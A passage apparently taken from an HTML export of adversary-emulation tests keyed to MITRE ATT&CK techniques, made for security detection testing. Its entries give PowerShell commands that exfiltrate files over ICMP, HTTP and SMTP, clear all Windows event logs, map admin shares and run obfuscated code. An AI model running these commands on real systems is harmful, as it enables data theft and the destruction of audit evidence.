<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 8b3f4ed6-077b-4bdd-891c-2d237f19410f</li>
<li><strong>name</strong>: Obfuscated Command in PowerShell</li>
<li>
<p><strong>description</strong>: This is an obfuscated PowerShell command which when executed prints "Hello, from PowerShell!". Example is from the 2021 Threat Detection Report by Red Canary.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $cmDwhy =<a href="&quot;{0}{1}&quot; -f" title="S','TrING">TyPe</a>  ;   $pz2Sb0  =<a href="&quot;{1}{0}{2}&quot;-f" title="nv','cO','ert">TYpE</a>  ;  &amp;("{0}{2}{3}{1}{4}" -f'In','SiO','vOKe-EXp','ReS','n') (  (&amp;("{1}{2}{0}"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y'))."v<code>ALUe"::("{1}{0}" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::"t</code>OinT`16"(( [sTring]${_}) ,8)))})) )</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1027</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: dd4b4421-2e25-4593-90ae-7021947ad12e</li>
<li><strong>name</strong>: Exfiltration Over Alternative Protocol - ICMP</li>
<li><strong>description</strong>: Exfiltration of specified file over ICMP protocol.</li>
</ul>
<p>Upon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1048.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 6aa58451-1121-4490-a8e9-1dada3f1c68c</li>
<li><strong>name</strong>: Exfiltration Over Alternative Protocol - HTTP</li>
<li>
<p><strong>description</strong>: Exfiltration of specified file over HTTP.
Upon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $content = Get-Content #{input_file}
Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1048.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: ec3a835e-adca-4c7c-88d2-853b69c11bb9</li>
<li><strong>name</strong>: Exfiltration Over Alternative Protocol - SMTP</li>
<li>
<p><strong>description</strong>: Exfiltration of specified file over SMTP.
Upon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1048.003 Atomic Test" -Attachments #{input_file} -SmtpServer #{smtp_server}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1048.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 514e9cd7-9207-4882-98b1-c8f791bae3c5</li>
<li><strong>name</strong>: Map Admin Share PowerShell</li>
<li>
<p><strong>description</strong>: Map Admin share utilizing PowerShell</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-PSDrive -name #{map_name} -psprovider filesystem -root \#{computer_name}#{share_name}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1021.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: b13e9306-3351-4b4b-a6e8-477358b0b498</li>
<li><strong>name</strong>: Delete System Logs Using Clear-EventLog</li>
<li>
<p><strong>description</strong>: Clear event logs using built-in PowerShell commands.
Upon successful execution, you should see the list of deleted event logs
Upon execution, open the Security.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty or has very few logs in it.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $logs = Get-EventLog -List | ForEach-Object {$<em>.Log}
$logs | ForEach-Object {Clear-EventLog -LogName $</em> }
Get-EventLog -list</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1070.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 2169e8b0-2ee7-44cb-8a6e-d816a5db7d8a</li>
<li><strong>name</strong>: Deploy 7-Zip Using Chocolatey</li>
<li>
<p><strong>description</strong>: An adversary may use Chocolatey to remotely deploy the 7-Zip file archiver utility.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: # Deploy 7-Zip using Chocolatey
choco install -y 7zip</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "${env:ProgramFiles(x86)}\Chocolatey\choco.exe") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Write-Host Downloading Chocolatey installer
Invoke-WebRequest -Uri "https://chocolatey.org/install.ps1" -OutFile "chocolatey-install.ps1"
Write-Host Installing Chocolatey
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File chocolatey-install.ps1" -Wait</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1072</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
